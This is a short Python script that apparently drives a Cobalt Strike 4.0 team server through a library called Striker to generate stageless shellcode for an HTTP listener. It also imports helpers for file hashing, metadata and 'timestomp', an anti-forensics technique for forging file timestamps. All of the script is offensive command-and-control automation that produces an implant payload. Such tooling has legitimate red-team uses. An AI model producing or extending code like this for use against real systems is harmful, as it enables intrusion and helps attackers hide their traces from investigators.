#!/usr/local/bin/python3
from Striker import CSConnector
from Artifactor import getExif, getHashes, timestomp


with CSConnector(
	cs_host="127.0.0.1", 
	cs_user="Faultline", 
	cs_directory="/Applications/Cobalt Strike 4.0/Cobalt Strike 4.0.app/Contents/Java") as cs:
		shellcode = cs.generateShellcode(
			listener="Localhost - HTTP",
			staged=False 
			)

